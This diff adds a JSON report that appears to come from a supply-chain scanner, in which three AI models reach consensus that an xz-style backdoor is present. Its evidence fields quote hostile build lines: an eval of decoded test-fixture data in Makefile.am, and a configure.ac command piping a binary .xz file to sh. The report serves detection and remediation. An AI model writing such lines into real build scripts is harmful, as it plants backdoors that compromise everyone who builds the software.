@@ -1,0 +1,56 @@
+{
+  "detected": true,
+  "risk_level": 4,
+  "signals": ["eval", "shell_exec", "binary_test_data", "obfuscated_payload", "backdoor"],
+  "categories": ["supply_chain", "backdoor"],
+  "findings": [
+    {
+      "id": "F1",
+      "severity": "critical",
+      "summary": "Build script executes obfuscated binary payload via eval",
+      "evidence": ["eval $$(cat tests/files/bad-3-corrupt_lzma2.xz | tr ... | sed ... | head -c 1024)"],
+      "file_paths": ["Makefile.am"],
+      "remediation": "Remove eval of binary data from build scripts. Audit test fixtures for embedded payloads."
+    },
+    {
+      "id": "F2",
+      "severity": "critical",
+      "summary": "configure.ac pipes binary file content to shell",
+      "evidence": ["AC_SUBST([SANDBOX_EXTRA], [`cat tests/files/bad-3-corrupt_lzma2.xz 2>/dev/null | sh`])"],
+      "file_paths": ["configure.ac"],
+      "remediation": "Remove shell execution of binary test data from autoconf scripts."
+    }
+  ],
+  "council": {
+    "enabled": true,
+    "models": ["claude-sonnet-4-5", "gpt-4o", "gemini-2.0-flash"],
+    "naive": {
+      "claude-sonnet-4-5": {
+        "risk_level": 4,
+        "signals": ["eval", "shell_exec", "obfuscated_payload"],
+        "findings": ["F1", "F2"]
+      },
+      "gpt-4o": {
+        "risk_level": 4,
+        "signals": ["binary_test_data", "backdoor", "shell_exec"],
+        "findings": ["F1", "F2"]
+      },
+      "gemini-2.0-flash": {
+        "risk_level": 4,
+        "signals": ["eval", "backdoor", "supply_chain"],
+        "findings": ["F1"]
+      }
+    },
+    "round_robin": {
+      "claude-sonnet-4-5": {"risk_level": 4, "accepted": ["F1", "F2"], "rejected": [], "added": []},
+      "gpt-4o": {"risk_level": 4, "accepted": ["F1", "F2"], "rejected": [], "added": []},
+      "gemini-2.0-flash": {"risk_level": 4, "accepted": ["F1", "F2"], "rejected": [], "added": []}
+    },
+    "consensus": {
+      "risk_level": 4,
+      "signals": ["eval", "shell_exec", "binary_test_data", "obfuscated_payload", "backdoor"],
+      "findings": ["F1", "F2"],
+      "human_required": true
+    }
+  }
+}
